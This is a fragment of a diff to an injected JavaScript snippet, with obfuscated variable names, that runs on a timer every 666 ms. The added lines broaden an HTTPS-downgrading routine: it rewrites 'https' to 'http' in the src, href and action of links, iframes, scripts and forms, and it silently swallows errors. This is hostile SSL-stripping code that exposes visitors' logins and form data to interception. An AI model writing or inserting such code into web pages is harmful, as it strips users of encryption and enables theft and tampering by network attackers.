@@ -8,12 +8,10 @@
 
 setInterval(function(){
 	try {
-		document.querySelectorAll("a, form").forEach(function(obf_var_node){
-			if (obf_var_node.tagName == "A") {
-				obf_var_node.href = obf_var_node.href.replace(/https/ig, "http");
-			} else {
-				obf_var_node.action = obf_var_node.action.replace(/https/ig, "http");
-			}
+		document.querySelectorAll("a,link,iframe,script,form").forEach(function(obf_var_node){
+			obf_var_node.src.match(/https/i) ? obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1") : "";
+			obf_var_node.href.match(/https/i) ? obf_var_node.href = obf_var_node.href.replace(/(http)s/ig, "$1") : "";
+			obf_var_node.action.match(/https/i) ? obf_var_node.action = obf_var_node.action.replace(/(http)s/ig, "$1") : "";
 		});
 	} catch(ignore){}
 }, 666);
